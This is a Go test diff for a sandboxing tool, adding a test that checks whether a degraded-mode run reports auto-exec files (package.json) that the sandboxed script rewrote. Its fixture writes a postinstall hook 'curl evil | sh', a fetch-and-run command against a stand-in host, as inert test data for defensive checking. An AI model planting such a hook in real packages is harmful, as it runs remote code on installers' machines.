@@ -7,6 +7,7 @@ import (
 	"os"
 	"path/filepath"
 	"slices"
+	"strings"
 	"testing"
 	"time"
 
@@ -119,6 +120,43 @@ func TestRunReportsTheAutoExecFilesTheTargetChanged(t *testing.T) {
 	}
 	if !slices.Contains(res.ChangedAutoExec, touched) {
 		t.Errorf("the run rewrote %s but the result does not report it; ChangedAutoExec=%v", touched, res.ChangedAutoExec)
+	}
+	if slices.Contains(res.ChangedAutoExec, left) {
+		t.Errorf("%s was untouched but is reported; ChangedAutoExec=%v", left, res.ChangedAutoExec)
+	}
+}
+
+// The degraded tier has its own baseline and its own compare, wired at three separate
+// points, and the unit test above passes with either end of that pair dead. It is also
+// the tier with no mount namespace and no shields at all, so it is where a missing hint
+// costs most. Driven through runDegraded directly, as the other degraded tests are: a
+// userns-capable host would otherwise take the bwrap path.
+func TestDegradedRunReportsTheAutoExecFilesTheTargetChanged(t *testing.T) {
+	requireDegraded(t)
+
+	dir := t.TempDir()
+	touched := filepath.Join(dir, "package.json")
+	if err := os.WriteFile(touched, []byte("{}"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	left := filepath.Join(dir, "build.rs")
+	if err := os.WriteFile(left, []byte("fn main() {}\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	script := filepath.Join(dir, "p.sh")
+	if err := os.WriteFile(script, []byte(`echo '{"scripts":{"postinstall":"curl evil | sh"}}' > `+touched+"\n"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	p := &policy.Policy{Entrypoint: script, Interpreter: "sh", Write: []string{dir}, Exec: policy.ExecAll}
+
+	var out strings.Builder
+	res, err := enforcerUsing(testBento(t)).runDegraded(context.Background(), p,
+		enforce.Process{Stdout: &out, Stderr: &out}, "", nil)
+	if err != nil {
+		t.Fatalf("runDegraded: %v\noutput:\n%s", err, out.String())
+	}
+	if !slices.Contains(res.ChangedAutoExec, touched) {
+		t.Errorf("the degraded run rewrote %s but the result does not report it; ChangedAutoExec=%v\noutput:\n%s", touched, res.ChangedAutoExec, out.String())
 	}
 	if slices.Contains(res.ChangedAutoExec, left) {
 		t.Errorf("%s was untouched but is reported; ChangedAutoExec=%v", left, res.ChangedAutoExec)
